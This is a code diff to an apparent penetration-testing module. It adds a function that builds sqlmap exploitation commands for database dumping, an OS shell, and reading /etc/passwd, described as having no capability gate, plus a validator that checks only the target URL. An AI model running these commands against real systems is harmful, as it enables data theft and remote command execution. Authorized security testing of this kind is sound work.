@@ -64,6 +64,43 @@ def build_safe_sqlmap_command(
     return cmd
 
 
+def build_exploit_sqlmap_command(
+    target_url: str,
+    parameter: str | None = None,
+    cookie: str | None = None,
+    exploit_type: str = "dump",
+    level: int = 3,
+    risk: int = 3,
+) -> list[str]:
+    """Full-exploitation SQLMap command (W5 -- no capability gate; the operator's authorized target scope
+    is the only boundary). `exploit_type`: 'dump' extracts table data, 'os_shell' attempts OS command
+    execution, 'read' reads a server file. The command is pinned to the authorized target_url."""
+    cmd = [
+        "sqlmap", "-u", target_url, "--batch",
+        f"--level={max(1, min(int(level), 5))}", f"--risk={max(1, min(int(risk), 3))}",
+        "--threads=4", "--timeout=15", "--retries=2", "--random-agent", "--flush-session",
+    ]
+    cmd.append({"os_shell": "--os-shell", "read": "--file-read=/etc/passwd"}.get(exploit_type, "--dump"))
+    if parameter:
+        cmd.extend(["-p", parameter])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+    return cmd
+
+
+def validate_exploit_sqlmap_command(cmd: list[str], authorized_target: str) -> None:
+    """The one invariant for exploitation: the target (-u) must equal the operator-authorized target, so
+    the tool never attacks a different host. Capability flags (--dump/--os-shell/--file-read) are allowed."""
+    if cmd[:1] != ["sqlmap"]:
+        raise ValueError("Not a sqlmap command")
+    try:
+        target = cmd[cmd.index("-u") + 1]
+    except (ValueError, IndexError):
+        raise ValueError("sqlmap exploit command must pin an explicit -u target") from None
+    if target != authorized_target:
+        raise ValueError(f"sqlmap target '{target}' is not the authorized target '{authorized_target}'")
+
+
 def validate_sqlmap_command(cmd: list[str]) -> None:
     """Validate that the command contains zero destructive exploitation options."""
     for arg in cmd:
@@ -201,6 +238,8 @@ def run_sqlmap_auxiliary_check(
 
 __all__ = [
     "build_safe_sqlmap_command",
+    "build_exploit_sqlmap_command",
+    "validate_exploit_sqlmap_command",
     "parse_sqlmap_output",
     "run_sqlmap_auxiliary_check",
     "validate_sqlmap_command",
